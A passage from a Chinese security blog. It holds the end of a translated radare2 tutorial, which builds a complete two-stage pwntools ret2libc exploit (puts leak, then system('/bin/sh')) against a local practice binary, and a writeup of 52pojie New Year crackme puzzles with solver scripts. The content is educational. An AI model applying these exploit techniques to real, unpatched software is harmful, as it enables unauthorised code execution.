我们需要填充puts@plt和puts@got的地址，以及程序的入口点。让我们回到radare2并执行以下命令。字符#用于注释，字符~是radare2的shell中的内置grep。 123456789[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts0x08048390[0xf7763b30]&gt; # the address of puts@got:[0xf7763b30]&gt; ?v reloc.puts_200x0804a014[0xf7763b30]&gt; # the address of program’s entry point (entry0):[0xf7763b30]&gt; ieq0x080483d0 sym.imp.puts和reloc.puts_20是radare2自动检测到的标志。命令ie表示Information Entrypoint。 现在我们填入我们找到的地址： 12345678... # Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0 ... 我们执行一下脚本： 1234567891011121314$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23578[*] puts is at: 0xf75db710[*] Stopped process ‘./megabeets_0x2’ (pid 23578) $ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23592[*] puts is at: 0xf7563710[*] Stopped process ‘./megabeets_0x2’ (pid 23592) $ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23606[*] puts is at: 0xf75e3710[*] Stopped process ‘./megabeets_0x2’ (pid 23606) 我执行了脚本三次，puts的地址每次都会变得不一样。因此我们不能提前预测它的地址。现在我们需要找到puts在libc中的偏移，然后计算出libc的基址。在我们找到基址后，我们可以用偏移计算出system、exit以及字符串/bin/sh的地址。 现在我们的脚本应该是这样： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import * # Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0 # Offsetsoffset_puts = offset_system = offset_str_bin_sh = offset_exit = # context.log_level = \"debug\" def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system binsh_addr = libc_base + offset_str_bin_sh exit_addr = libc_base + offset_exit log.info(\"system: 0x%x\" % system_addr) log.info(\"binsh: 0x%x\" % binsh_addr) log.info(\"exit: 0x%x\" % exit_addr) if __name__ == \"__main__\": main() 计算真实地址请注意在文章的这部分，我的结果可能与你的不同。因为我们的libc版本不同，所以会产生不同的偏移。 首先我们需要找到puts在libc上的偏移。我们再一次打开radare2，继续执行到入口点。做以上步骤的原因是我们在libc载入之前开始调试程序，直到入口点时，运行库才全部加载完。 我们使用dmi命令，将libc和函数作为参数。我加上了~来显示相关的信息。 123456789101112131415161718192021$ r2 -d megabeets_0x2Process with PID 24124 started…= attach 24124 24124bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— A C program is like a fast dance on a newly waxed dance floor by people carrying razors – Waldi Ravens[0xf771ab30]&gt; dcu entry0Continue until 0x080483d0 using 1 bpsizehit breakpoint at: 80483d0[0x080483d0]&gt; dmi libc puts~ puts$vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts[0x080483d0]&gt; dmi libc system~ system$vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system[0x080483d0]&gt; dmi libc exit~ exit$vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit 请注意，在这篇文章发表前，dmi的输出格式就已经改变了。你的结果很有可能与我的有所不同。 所有这些paddr=0x000xxxxx是函数在libc上的偏移。现在我们需要在程序中找到/bin/sh的位置。我们将要使用radare2的一些搜索功能。radare2默认在dbg.map，也就是当前内存中查找。我们想要在所有内存中查找则需要设置成： 1[0x080483d0]&gt; e search.in = dbg.maps 你可以执行e search.in=?查看更多选项。执行Ve配置可视化模式 在radare2中通过/命令查找。让我们看看radare2给我们提供的查找参数： 123456789101112131415161718192021222324252627282930313233|Usage: /[amx/] [arg]Search stuff (see ‘e??search’ for options)| / foo\\x00 search for string ‘foo\\0’| /j foo\\x00 search for string ‘foo\\0’ (json output)| /! ff search for first occurrence not matching| /+ /bin/sh construct the string with chunks| /!x 00 inverse hexa search (find first byte != 0x00)| // repeat last search| /h[t] [hash] [len] find block matching this hash. See /#?| /a jmp eax assemble opcode and search its bytes| /A jmp find analyzed instructions of this type (/A? for help)| /b search backwards| /B search recognized RBin headers| /c jmp [esp] search for asm code| /C[ar] search for crypto materials| /d 101112 search for a deltified sequence of bytes| /e /E.F/i match regular expression| /E esil-expr offset matching given esil expressions %%= here| /f file [off] [sz] search contents of file with offset and size| /i foo search for string ‘foo’ ignoring case| /m magicfile search for matching magic file (use blocksize)| /o show offset of previous instruction| /p patternsize search for pattern of given size| /P patternsize search similar blocks| /r[e] sym.printf analyze opcode reference an offset (/re for esil)| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated| /v[1248] value look for an cfg.bigendian 32bit value| /V[1248] min max look for an cfg.bigendian 32bit value in range| /w foo search for wide string ‘f\\0o\\0o\\0’| /wi foo search for wide string ignoring case ‘f\\0o\\0o\\0’| /x ff..33 search for hex string ignoring some nibbles| /x ff0033 search for hex string| /x ff43 ffd0 search for hexpair with mask| /z min max search for strings of given size 提供给我们了许多不同的方式。同时还发心/R能够帮助我们查找ROP。可惜这篇文章里我们没有打算使用ROP。但其他情况下，你们写利用脚本时一定很喜欢用它。 我们不需要任何花哨的东西，只用最简单的查找即可。在这之后，我们先找到当前libc载入的地址，然后计算出/bin/sh的偏移。 12345678910[0x080483d0]&gt; / /bin/shSearching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68Searching 7 bytes in [0x8048000-0x8049000]hits: 0Searching 7 bytes in [0x8049000-0x804a000]hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]hits: 0Searching 7 bytes in [0xffd2f000-0xffd50000]hits: 00xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica. r2在内存中找到了/bin/sh。现在我们计算它相对libc基址的偏移： 1234[0x080483d0]&gt; dmm~libc0xf7599000 /usr/lib32/libc-2.25.so[0x080483d0]&gt; ?X 0xf7700768-0xf7599000167768 我们发现/bin/sh相对libc基址的偏移为0x167768。我们把它填进脚本中，并且可以开始我们的最后一个步骤。 123456789...# Offsetsoffset_puts = 0x00062710 offset_system = 0x0003c060 offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768 ... 获取shell漏洞利用的第二阶段很直接。我们继续使用140个字符，然后调用system并将/bin/sh作为参数，最后exit。 12345678+---------------------+| Stage 2 |+---------------------+| padding (140 bytes) || system@libc || exit@libc || /bin/sh address |+---------------------+ 还记得上一次我们返回到了入口点吗？这意味着scanf又在等待我们的输入。现在我们所做的就是把这些调用串联起来传给程序。 这是我们最后的脚本。像我之前所说的，你只需要替换符合你的libc的偏移。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import * # Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0 # Offsetsoffset_puts = 0x00062710 offset_system = 0x0003c060 offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768 # context.log_level = \"debug\" def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system exit_addr = libc_base + offset_exit binsh_addr = libc_base + offset_str_bin_sh log.info(\"system is at: 0x%x\" % system_addr) log.info(\"/bin/sh is at: 0x%x\" % binsh_addr) log.info(\"exit is at: 0x%x\" % exit_addr) # Build 2nd payload payload2 = \"A\"*140 ropchain2 = p32(system_addr) ropchain2 += p32(exit_addr) # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5) # Then you'll execute system(\"sh\") ropchain2 += p32(binsh_addr) payload2 = payload2 + ropchain2 p.sendline(payload2) log.success(\"Here comes the shell!\") p.clean() p.interactive() if __name__ == \"__main__\": main() 跑这个脚本我们就能成功拿到一个shell： 1234567891011121314$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 24410[*] puts is at: 0xf75db710[*] libc base: 0xf75ce000[*] system is at: 0xf760a060[*] /bin/sh is at: 0xf7735768[*] exit is at: 0xf75fd1b0[+] Here comes the shell![*] Switching to interactive mode: $ whoamibeet$ echo EOFEOF 后记Radare2之旅的第二部分就到此结束了。我们简单地学习了一些radare2中漏洞利用的功能。在下一部分中，我们会学习radare2再脚本编写和恶意软件分析中的功能。 漏洞利用命令对应表这是一系列我在本文中提到的命令（还有一些补充）。你可以把它作为一份参考表。 获取信息 $ rabin2 -I ./program——二进制信息（和radare2的shell中i命令相同） ii [q]——导入表 ?v sym.imp.func_name——获取func_name@PLT地址 ?v reloc.func_name——获取func_name@GOT地址 ie [q]——获取入口点地址 iS——查看区段的各个权限（读/写/执行） i~canary——检查是否开启Canary i~pic——检查是否开启PIE i~nx——检查是否开启NX 内存 dm——查看内存信息 dmm——列出模块（内存中的运行库和二进制模块） dmi [addr|libname] [symname]——列出目标库的标志 查找 e search.*——编辑查找配置 /?——列出查找的子命令 / string——在内存或程序段查找字符串 /R [?]——查找特定的ROP /R/——ROP常规搜索 调试 dc——继续执行 dcu addr——继续执行到某个地址 dcr——继续执行直到ret（单步步过） dbt [?]——在dbg.btdepth和dbg.btalgo的基础上回溯指令 doo [args]——重新打开调试并设置参数 ds——单步步入 dso——单步步过 图形模式 pdf @ addr——输出当前位移下函数的汇编代码 V——可视化模式，使用p/P再两个模式间切换 VV——图形模式，在ascii图像下分析 V!——控制板模式，对漏洞利用非常有用 看看这篇文章，也许有更多的内容能够帮助到你。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"},{"name":"translation","slug":"translation","permalink":"https://qianfei11.github.io/tags/translation/"}]},{"title":"2019-吾爱破解解题领红包活动-writeup","slug":"2019-吾爱破解解题领红包活动-writeup","date":"2019-02-21T12:33:03.000Z","updated":"2019-02-27T02:25:41.122Z","comments":true,"path":"2019/02/21/2019-吾爱破解解题领红包活动-writeup/","link":"","permalink":"https://qianfei11.github.io/2019/02/21/2019-吾爱破解解题领红包活动-writeup/","excerpt":"做了点简单的题目。","text":"做了点简单的题目。 【春节】解题领红包之一扫码关注即可。 【春节】解题领红包之二查壳是upx，ESP定律法找到OEP脱壳。然后放进ida里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647HWND main_func()&#123; HWND result; // eax char *input; // esi char *key; // edi int enc_1; // [esp+0h] [ebp-14h] int enc_2; // [esp+4h] [ebp-10h] int enc_3; // [esp+8h] [ebp-Ch] int enc_4; // [esp+Ch] [ebp-8h] char v7; // [esp+10h] [ebp-4h] result = GetDlgItem(0, 1000); if ( result ) &#123; if ( GetWindowTextLengthA(result) == 16 ) &#123; input = (char *)malloc(0x11u); key = (char *)malloc(0x11u); *(_DWORD *)input = 0; *((_DWORD *)input + 1) = 0; *((_DWORD *)input + 2) = 0; *((_DWORD *)input + 3) = 0; input[16] = 0; *(_DWORD *)key = 0; *((_DWORD *)key + 1) = 0; *((_DWORD *)key + 2) = 0; *((_DWORD *)key + 3) = 0; key[16] = 0; GetDlgItemTextA(0, 1000, input, 17); enc_3 = 'udhY'; enc_1 = 'ssdH'; enc_2 = 'zhNb'; enc_4 = '9102'; v7 = 0; encrypt((const char *)&amp;enc_1, (int)key, 3); if ( !strcmp(key, input) ) result = (HWND)MessageBoxA(0, aOye, Caption, 0); else result = (HWND)MessageBoxA(0, aAuey, Caption, 0); &#125; else &#123; result = (HWND)MessageBoxA(0, &amp;Text, Caption, 0); &#125; &#125; return result;&#125; 看下来应该就是把16位的enc加密了一下，然后和input比较。看看encrypt()函数： 123456789101112131415161718192021222324252627282930313233343536373839404142signed int __cdecl encrypt(const char *enc, int key, int num_3)&#123; const char *enc_0; // edx unsigned int length; // kr04_4 int v5; // esi int i; // edi char c; // al char alphabet[29]; // [esp+Bh] [ebp-1Dh] char tmp; // [esp+30h] [ebp+8h] strcpy(&amp;alphabet[1], \"abcdefghijklmnopqrstuvwxyz\"); if ( !key ) return -1; enc_0 = enc; if ( !enc ) return -1; if ( num_3 &lt;= 0 ) return -1; length = strlen(enc) + 1; if ( (signed int)(length - 1) &lt;= 0 ) return -1; v5 = key - (_DWORD)enc; tmp = alphabet[num_3 + 1]; i = length - 1; do &#123; c = *enc_0; if ( *enc_0 &lt; tmp || c &gt; 122 ) &#123; if ( c &gt;= 97 &amp;&amp; c &lt;= alphabet[num_3] ) c = c - num_3 + 26; &#125; else &#123; c -= num_3; &#125; (enc_0++)[v5] = c; --i; &#125; while ( i ); return 0;&#125; 就是对字符串判断是否为字母，然后根据字母表alphabet做映射和加减。正向实现一下脚本就得到口令了： 1234567891011121314151617181920212223#!/usr/bin/env pythonenc = ('9102' + 'udhY' + 'zhNb' + 'ssdH')[::-1]print encalpha = 'abcdefghijklmnopqrstuvwxyz'num = 3t = alpha[num + 1]i = len(enc)j = 0res = ''while i != 0: c = enc[j] if ord(c) &lt; ord(t) or ord(c) &gt; 122: if ord(c) &gt;= 97 and ord(c) &lt;= ord(alpha[num]): c = chr(ord(c) - num + 26) if ord(c) &gt; ord(alpha[-1]): c = chr(ord(c) - 26) else: c = chr(ord(c) - num) res += c j += 1 i -= 1print res# HappyNewYear2019 【春节】解题领红包之三这道题我查了壳然后不会脱就一直没做。看了writeup居然是直接进ida就分析了。搜索到main函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156int main_main()&#123; int v0; // ST04_4 _DWORD *v1; // ST04_4 _DWORD *v2; // ST04_4 int v3; // ST04_4 _DWORD *v4; // ST04_4 int v5; // ST10_4 int v6; // ST14_4 int v7; // ST18_4 int v8; // ST04_4 int result; // eax char v10; // ST0C_1 int v11; // [esp+0h] [ebp-7Ch] int v12; // [esp+4h] [ebp-78h] int v13; // [esp+4h] [ebp-78h] int v14; // [esp+8h] [ebp-74h] int v15; // [esp+Ch] [ebp-70h] int v16; // [esp+Ch] [ebp-70h] int v17; // [esp+Ch] [ebp-70h] char v18; // [esp+Ch] [ebp-70h] int v19; // [esp+10h] [ebp-6Ch] int v20; // [esp+10h] [ebp-6Ch] int v21; // [esp+10h] [ebp-6Ch] int v22; // [esp+14h] [ebp-68h] int v23; // [esp+14h] [ebp-68h] int v24; // [esp+14h] [ebp-68h] int v25; // [esp+14h] [ebp-68h] unsigned int v26; // [esp+18h] [ebp-64h] int v27; // [esp+18h] [ebp-64h] int v28; // [esp+1Ch] [ebp-60h] int v29; // [esp+1Ch] [ebp-60h] int v30; // [esp+20h] [ebp-5Ch] int v31; // [esp+24h] [ebp-58h] int v32; // [esp+28h] [ebp-54h] int v33; // [esp+2Ch] [ebp-50h] int v34; // [esp+2Ch] [ebp-50h] _DWORD *v35; // [esp+30h] [ebp-4Ch] _DWORD *v36; // [esp+34h] [ebp-48h] _DWORD *v37; // [esp+38h] [ebp-44h] int *v38; // [esp+3Ch] [ebp-40h] int v39; // [esp+40h] [ebp-3Ch] int *v40; // [esp+44h] [ebp-38h] void *v41; // [esp+48h] [ebp-34h] int *v42; // [esp+4Ch] [ebp-30h] void *v43; // [esp+50h] [ebp-2Ch] int *v44; // [esp+54h] [ebp-28h] _DWORD *v45; // [esp+58h] [ebp-24h] int *v46; // [esp+5Ch] [ebp-20h] void *v47; // [esp+60h] [ebp-1Ch] int *v48; // [esp+64h] [ebp-18h] _DWORD *v49; // [esp+68h] [ebp-14h] int *v50; // [esp+6Ch] [ebp-10h] void *v51; // [esp+70h] [ebp-Ch] int *v52; // [esp+74h] [ebp-8h] void *v53; // [esp+78h] [ebp-4h] void *retaddr; // [esp+7Ch] [ebp+0h] if ( (unsigned int)&amp;retaddr &lt;= *(_DWORD *)(*(_DWORD *)__readfsdword(0x14u) + 8) ) runtime_morestack_noctxt(); v52 = dword_4A04E0; v53 = &amp;main_statictmp_0; fmt_Println(&amp;v52, 1, 1); runtime_newobject(dword_4A04E0, v0); v36 = v1; runtime_newobject(dword_4A04E0, v1); v37 = v2; v50 = dword_4A04E0; v51 = &amp;main_statictmp_1; fmt_Print(&amp;v50, 1, 1); v48 = dword_498EE0; v49 = v36; fmt_Scanln(&amp;v48, 1, 1); v46 = dword_4A04E0; v47 = &amp;main_statictmp_2; fmt_Print(&amp;v46, 1, 1); v44 = dword_498EE0; v45 = v37; fmt_Scanln(&amp;v44, 1, 1); runtime_newobject(dword_4A90C0, v3); v35 = v4; *v4 = 1732584193; v4[1] = -271733879; v4[2] = -1732584194; v4[3] = 271733878; v4[4] = -1009589776; v4[21] = 0; v4[22] = 0; v4[23] = 0; runtime_stringtoslicebyte(0, *v36, v36[1]); crypto_sha1___digest__Write(v35, v15, v19, v22, v19, v22); crypto_sha1___digest__Sum(v35, 0, 0, 0, v5, v6); if ( v26 &lt; 0x10 ) runtime_panicslice( v11, v12, v14, v16, v20, v23, v26, v28, v30, v31, v32, v33, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52, v53); v34 = v20; encoding_base64___Encoding__DecodeString(encoding_base64_StdEncoding, *v37, v37[1], v16, v20, v23, v26); if ( v7 ) &#123; v42 = dword_4A04E0; v43 = &amp;main_statictmp_3; result = fmt_Println(&amp;v42, 1, 1); &#125; else &#123; main_AesDecrypt(v17, v21, v24, v34, 16, 16, 0, v28); if ( v31 ) &#123; v40 = dword_4A04E0; v41 = &amp;main_statictmp_4; result = fmt_Println(&amp;v40, 1, 1); &#125; else &#123; if ( v29 == 26 &amp;&amp; (runtime_memequal(v27, dword_4B8A80, 26, v18), v10) ) fmt_Printf(dword_4BCC04, 73, 0, 0, 0, v25, v27, 26); else fmt_Printf(&amp;word_4B84CE, 24, 0, 0, 0, v25, v27, v29); runtime_newobject(dword_4A04E0, v13); v38 = dword_498EE0; v39 = v8; result = fmt_Scanln(&amp;v38, 1, 1); &#125; &#125; return result;&#125; 大概可以推测，先进行base64，然后aes解密，最后和数据段中一串长度为26的字符串比较。具体字符串我们可以dump出来： 123456data = [0x48, 0x61, 0x70, 0x70, 0x79, 0x4E, 0x65, 0x77, 0x59, 0x65, 0x61, 0x72, 0x46, 0x72, 0x6F, 0x6D, 0x35, 0x32, 0x50, 0x6F, 0x4A, 0x69, 0x65, 0x2E, 0x43, 0x6E, 0x4C, 0x69, 0x6E, 0x65, 0x20, 0x49, 0x73, 0x6C, 0x61, 0x6E, 0x64, 0x73, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x4E, 0x65, 0x77, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x6C, 0x61, 0x6E, 0x64, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69]output = ''for i in range(26): output += chr(data[i])print output# HappyNewYearFrom52PoJie.Cn 调试中可以从内存里dump到EF2D8BFA0C30AB270B92CC73A563AFA3其实这一串数据就是uid对应的sha1散列值ef2d8bfa0c30ab270b92cc73a563afa3b04faa75的字节数组形式，取前16位AES加密方式为CBC（main_AesDecrypt函数中可以直接看出），补码方式为PKCS5Padding（AES解密错误时，会退出程序，但是有异常信息一闪而过，给报错函数下断点即可查看异常信息）所以把EF2D8BFA0C30AB270B92CC73A563AFA3转化成字节数组，使用AES/CBC/PKCS5Padding方式加密HappyNewYearFrom52PoJie.Cn，再进行base64加密就可得到口令。 go语言实现代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( \"fmt\" \"bytes\" \"crypto/cipher\" \"crypto/sha1\" \"crypto/aes\" \"encoding/base64\")func PKCS5Padding(ciphertext []byte, blockSize int) []byte &#123; padding := blockSize - len(ciphertext)%blockSize padtext := bytes.Repeat([]byte&#123;byte(padding)&#125;, padding) return append(ciphertext, padtext...)&#125;func PKCS5UnPadding(origData []byte) []byte &#123; length := len(origData) unpadding := int(origData[length-1]) return origData[:(length - unpadding)]&#125;func AesEncrypt(origData, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() origData = PKCS5Padding(origData, blockSize) blockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) crypted := make([]byte, len(origData)) blockMode.CryptBlocks(crypted, origData) return crypted, nil&#125;func AesDecrypt(crypted, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) origData := make([]byte, len(crypted)) blockMode.CryptBlocks(origData, crypted) origData = PKCS5UnPadding(origData) return origData, nil&#125;func main() &#123; uid := \"351649\" h := sha1.New() h.Write([]byte(uid)) bs := h.Sum(nil) var aeskey = bs[0:16] pass := []byte(\"HappyNewYearFrom52PoJie.Cn\") xpass, err := AesEncrypt(pass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; pass64 := base64.StdEncoding.EncodeToString(xpass) fmt.Printf(\"加密后:%v\\n\",pass64) bytesPass, err := base64.StdEncoding.DecodeString(pass64) if err != nil &#123; fmt.Println(err) return &#125; tpass, err := AesDecrypt(bytesPass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; fmt.Printf(\"解密后:%s\\n\", tpass)&#125; 【春节】解题领红包之番外篇番外篇个人感觉应该算是一道ctf里的misc题了。压缩包里给了一个大部分文字被加密的md文件： 12345678910111213# ȐĆŅƃȓƇńƃȒċƝÞɌÇńßɌĉŇƅŕƇŃbȒȼȵßȒĆȵƁȓĉnƁɌćǸßƦćƝƁȓĉnƅȓčƞÞɌćÑbȒČŃbȒċÑbŕƇŃþȒČNƃȒĈÑƄȓĊÑƄŕƇņÞȓčƞÞɌćÑbȒċƝÞŘcǸÞȐĆŅBƦĊȵþřÇȵƅȐċŇbɌcńþȓČŇƁŕƇNƀȒČŃBɌćÑBɌċnƄȓĈƝbŗƇƞÞŗčnBŕƇnþȒȻŃBȓĉnƅȒČNƅȒƈŇþŕčȠßŕƇŃƃřčȠbřċȵƀȐčNƄŕƇņƃɌcŅƄɌċnþŕƇŇƁȓƇńƁŕƇńþɌcńƄŕƇńþɌCňƀƦȻƝƃŕƇńþɌCňƀȐĉņþŗcŅƅȒĈÑƄȓĊǸƅȓĈȵþɌćƞßŕƇņÞȒȻŃþɌCňƀɌćǸbȒȼǹßȓĈƝB[ƦĉņƃŖċŅþŕƇŅƀȒCŅƀȒƈŇþɌcŅƄɌĉŇßŕƇņÞȓčƞÞȒƈňþŕƇńþȓĉnþȓČŇBŗcŅƅɌćƞƁȓćŅƁŕƇņÞȒȻŃþɌCňƁ](//rcnb.xyz)řĊÑbȒĉȠƀɌćÑbȒċƝÞȓćŅƁɌƈȠƃŕƇŃþȒȻŃþȒĈƞÞȑÇǹƄɌCȠƄƦȻŇƅɌćƞBȐčnÞŗÇÑBřĊÑbɌĆnþŗÇǹbȐȼŃßɌćÑbŕƇņÞȒȻŃƄŕƇņÞɌcńþȒCŅbŕȻŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐč